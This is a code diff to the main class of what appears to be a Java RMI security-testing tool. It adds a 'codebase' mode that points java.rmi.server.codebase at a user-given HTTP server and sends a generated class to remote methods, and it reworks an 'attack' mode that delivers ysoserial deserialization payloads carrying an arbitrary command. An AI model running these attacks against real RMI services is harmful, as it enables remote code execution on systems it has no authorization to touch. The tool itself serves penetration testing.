@@ -1,8 +1,6 @@
 package de.qtc.rmg;
 
-import java.io.FileInputStream;
 import java.io.IOException;
-import java.io.InputStream;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
@@ -28,6 +26,7 @@ public class Starter {
 
     private static String defaultConfiguration = "/config.properties";
 
+    @SuppressWarnings({ "rawtypes", "deprecation" })
     public static void main(String[] argv) {
 
         ArgumentParser parser = new ArgumentParser();
@@ -41,20 +40,37 @@ public class Starter {
         if( parser.getArgumentCount() >= 3 ) {
             action = parser.getPositionalString(2);
 
-            if( action == "attack" ) {
+            if( action.equals("attack") || action.equals("codebase")) {
                 parser.checkArgumentCount(5);
+
+                if(!commandLine.hasOption("signature")) {
+                    Logger.eprintlnMixedYellow("The", "--signature", "option is required for " + action + " mode.");
+                    RMGUtils.exit();
+                }
+            }
+
+            if( action.equals("codebase" )) {
+                String serverAddress = parser.getPositionalString(3);
+
+                if( !serverAddress.startsWith("http") )
+                    serverAddress = "http://" + serverAddress + "/";
+
+                if( !serverAddress.endsWith("/") )
+                    serverAddress = serverAddress + "/";
+
+                System.setProperty("java.rmi.server.codebase", serverAddress);
             }
         }
 
         Properties config = new Properties();
-        Starter.loadConfig(defaultConfiguration, config, false);
+        RMGUtils.loadConfig(defaultConfiguration, config, false);
 
         String additionalConfig = commandLine.getOptionValue("config", null);
         if( additionalConfig != null )
-            Starter.loadConfig(additionalConfig, config, true);
+            RMGUtils.loadConfig(additionalConfig, config, true);
 
         int legacyMode = parser.getLegacyMode();
-        int argumentPos = Integer.valueOf(commandLine.getOptionValue("argument-position", "0"));
+        int argumentPos = Integer.valueOf(commandLine.getOptionValue("argument-position", "-1"));
         int threadCount = Integer.valueOf(commandLine.getOptionValue("threads", config.getProperty("threads")));
         String sampleFolder = commandLine.getOptionValue("sample-folder", config.getProperty("sample-folder"));
         String wordlistFile = commandLine.getOptionValue("wordlist-file", config.getProperty("wordlist-file"));
@@ -81,7 +97,10 @@ public class Starter {
         RMGUtils.init();
         rmi.connect(host, port, sslValue, followRedirect);
         String[] boundNames = rmi.getBoundNames();
+
         ArrayList<HashMap<String,String>> boundClasses = rmi.getClassNames(boundNames);
+        HashMap<String,String> allClasses = boundClasses.get(0);
+        allClasses.putAll(boundClasses.get(1));
 
         MethodCandidate candidate = null;
         if( functionSignature != null ) {
@@ -92,20 +111,18 @@ public class Starter {
             } catch (CannotCompileException | NotFoundException e) {
                 Logger.eprintln("Supplied method signature seems to be invalid.");
                 Logger.eprintlnMixedYellow("The following exception was caught:", e.getMessage());
-                Logger.eprintln("Cannot continue from here.");
-                System.exit(1);
+                RMGUtils.exit();
             }
         }
 
         switch( action ) {
 
             case "guess":
-                if( !containsUnknown(boundClasses.get(1)) )
+                if( !RMGUtils.containsUnknown(boundClasses.get(1)) )
                     break;
 
                 List<MethodCandidate> candidates = new ArrayList<MethodCandidate>();
                 if( candidate != null ) {
-
                     candidates.add(candidate);
 
                 } else {
@@ -115,8 +132,7 @@ public class Starter {
                         candidates = wlHandler.getWordlistMethods();
                     } catch( IOException e ) {
                         Logger.eprintlnMixedYellow("Caught exception while reading wordlist file(s):", e.getMessage());
-                        Logger.eprintln("Cannot continue from here.");
-                        System.exit(1);
+                        RMGUtils.exit();
                     }
                 }
 
@@ -169,12 +185,38 @@ public class Starter {
                 String gadget = parser.getPositionalString(3);
                 String command = parser.getPositionalString(4);
 
-                HashMap<String,String> classes = boundClasses.get(0);
-                classes.putAll(boundClasses.get(1));
+                if(ysoserialPath == null) {
+                    Logger.eprintlnMixedYellow("Path for", "ysoserial.jar", "is null.");
+                    Logger.increaseIndent();
+                    Logger.eprintlnMixedYellow("Check your configuration file or specify it on the command line using the", "--yso", "parameter");
+                    RMGUtils.exit();
+                }
 
                 Object payload = RMGUtils.getPayloadObject(ysoserialPath, gadget, command);
-                MethodAttacker attacker = new MethodAttacker(rmi, classes, candidate);
-                attacker.attack(payload, boundName, argumentPos);
+                MethodAttacker attacker = new MethodAttacker(rmi, allClasses, candidate);
+                attacker.attack(payload, boundName, argumentPos, "ysoserial");
+
+                break;
+
+            case "codebase":
+
+                String className = parser.getPositionalString(4);
+
+                payload = null;
+
+                try {
+                    payload = RMGUtils.makeSerializableClass(className);
+                    payload = ((Class)payload).newInstance();
+
+                } catch (CannotCompileException | NotFoundException | InstantiationException | IllegalAccessException e) {
+                    Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during payload creation.");
+                    Logger.eprintln("StackTrace:");
+                    e.printStackTrace();
+                    RMGUtils.exit();
+                }
+
+                attacker = new MethodAttacker(rmi, allClasses, candidate);
+                attacker.attack(payload, boundName, argumentPos, "codebase");
 
                 break;
 
@@ -184,36 +226,6 @@ public class Starter {
 
             case "enum":
                 format.listBoundNames(boundNames, boundClasses);
-        }
-    }
-
-    private static boolean containsUnknown(HashMap<String,String> unknownClasses)
-    {
-        if( unknownClasses.size() <= 0 ) {
-            Logger.eprintln("No unknown classes identified.");
-            Logger.eprintln("Guessing methods not necessary.");
-            return false;
-        }
-
-        return true;
-    }
-
-    private static void loadConfig(String filename, Properties prop, boolean extern) {
-
-        InputStream configStream = null;
-        try {
-            if( extern ) {
-                configStream = new FileInputStream(filename);
-            } else {
-                configStream = Starter.class.getResourceAsStream(filename);
-            }
-
-        prop.load(configStream);
-        configStream.close();
-
-        } catch( IOException e ) {
-            Logger.eprintln("Unable to load properties file '" + filename + "'");
-            System.exit(1);
         }
     }
 }
